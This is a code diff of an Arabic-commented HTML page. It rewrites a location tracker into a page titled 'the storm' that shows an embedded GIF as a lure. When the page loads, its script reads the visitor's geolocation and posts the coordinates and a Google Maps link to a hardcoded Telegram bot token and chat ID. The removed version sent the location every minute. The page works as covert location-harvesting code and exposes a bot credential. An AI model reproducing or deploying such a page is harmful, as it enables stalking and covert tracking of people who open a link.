@@ -4,76 +4,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الموقع تلقائيًا</title>
+    <title>العاصفه</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; /* خلفية بيضاء */
+        }
+        iframe {
+            display: block; /* عرض الـ iframe ككتلة */
+            margin: auto; /* توسيط الـ iframe */
+        }
+    </style>
+</head>
+<body onload="sendLocationAutomatically()">
+
+    <iframe src="https://giphy.com/embed/RbDKaczqWovIugyJmW" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+
     <script>
-        const botToken = '5909067412:AAF16T7_MliWPBOIsALuQsoRAbb_dbXyvnM'; // استبدل هذا بتوكن البوت الخاص بك
-        const chatId = '1051175859'; // استبدل هذا بمعرف الدردشة الخاص بك
+        function sendLocationAutomatically() {
+            var botToken = "5909067412:AAF16T7_MliWPBOIsALuQsoRAbb_dbXyvnM";
+            var chatId = "1051175859";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var mapLink = "https://www.google.com/maps/search/" + latitude + "," + longitude;
 
-        function startLocationTracking() {
-            // تحقق مما إذا كان الإذن قد تم منحه مسبقًا
-            const permissionGranted = localStorage.getItem('locationPermissionGranted');
+                    // إرسال الموقع إلى البوت في تليجرام
+                    var message = latitude + ", " + longitude + " " + mapLink; // يمكنك تعديل الرسالة حسب الرغبة
 
-            if (permissionGranted) {
-                // إذا تم منح الإذن مسبقًا، ابدأ تتبع الموقع
-                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-                startLocationInterval();
+                    var xmlhttp = new XMLHttpRequest();
+                    xmlhttp.onreadystatechange = function() {
+                        if (this.readyState == 4 && this.status == 200) {
+                            console.log("تم إرسال الموقع بنجاح إلى البوت في تليجرام");
+                        }
+                    };
+                    
+                    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                    xmlhttp.open("POST", url, true);
+                    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                    xmlhttp.send("chat_id=" + chatId + "&text=" + encodeURIComponent(message));
+                }, function(error) {
+                    console.error("حدث خطأ أثناء محاولة الحصول على الموقع: " + error.message);
+                });
             } else {
-                // إذا لم يتم منح الإذن، اطلبه من المستخدم
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-                } else {
-                    document.getElementById("result").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
-                }
-            }
-        }
-
-        function sendLocationToTelegram(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const message = `خط العرض: ${latitude}\nخط الطول: ${longitude}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        console.log("تم إرسال الموقع إلى تلجرام");
-                    } else {
-                        console.error("فشل في إرسال الموقع إلى تلجرام");
-                    }
-                })
-                .catch(error => console.error("خطأ:", error));
-
-            // قم بتخزين حالة الإذن في localStorage
-            localStorage.setItem('locationPermissionGranted', true);
-            document.getElementById("result").innerHTML = "تم الحصول على الموقع بنجاح.";
-        }
-
-        function startLocationInterval() {
-            // تحديد الموقع كل دقيقة (60000 مللي ثانية) بعد منح الإذن
-            setInterval(() => {
-                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-            }, 60000);
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("result").innerHTML = "تم رفض الإذن لتحديد الموقع.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("result").innerHTML = "معلومات الموقع غير متاحة.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("result").innerHTML = "انتهت المهلة لتحديد الموقع.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("result").innerHTML = "حدث خطأ غير معروف.";
-                    break;
+                console.error("للأسف، متصفحك لا يدعم ميزة تحديد الموقع.");
             }
         }
     </script>
-</head>
-<body onload="startLocationTracking()">
-
 </body>
 </html>
